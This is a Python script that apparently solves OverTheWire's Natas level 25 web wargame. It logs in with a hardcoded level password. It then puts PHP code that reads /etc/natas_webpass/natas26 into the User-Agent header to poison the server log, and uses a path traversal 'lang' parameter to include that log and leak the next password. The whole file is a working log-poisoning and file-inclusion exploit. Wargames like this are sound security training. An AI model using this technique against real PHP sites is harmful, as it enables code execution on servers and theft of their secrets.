import requests

# URL and parameters

uri = "http://natas25.natas.labs.overthewire.org?"

# Auth credentials
auth_username = "natas25"
auth_password = "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"

# Set the custom user-agent
user_agent = "<?php global $__FOOTER; $__FOOTER=file_get_contents('/etc/natas_webpass/natas26'); ?>"

# Create a session to handle cookies and headers
session = requests.Session()

# Set the custom user-agent in the session headers
session.headers.update({"User-Agent": user_agent})

# Perform the initial GET request to get the PHPSESSID cookie
response = session.get(uri, auth=(auth_username, auth_password))

# Check if the request was successful (status code 200 indicates success)
if response.status_code == 200:
    # Get the PHPSESSID from the response cookies
    sessid = response.cookies.get("PHPSESSID")
    print(sessid)
    langstr = 'lang=..././logs/natas25_'+sessid+".log"
    uri = "http://natas25.natas.labs.overthewire.org?" + langstr

    # Now set the PHPSESSID cookie in the session
    session.cookies.set("PHPSESSID", sessid, domain=".natas25.natas.labs.overthewire.org")

    # Perform the actual GET request using the updated session with the PHPSESSID cookie
    response = session.get(uri, auth=(auth_username, auth_password))

    # Check if the second request was successful
    if response.status_code == 200:
        # Process the response content (response.text contains the HTML content)
        print(response.text)
    else:
        print(f"Second request failed with status code: {response.status_code}")
else:
    print(f"First request failed with status code: {response.status_code}")
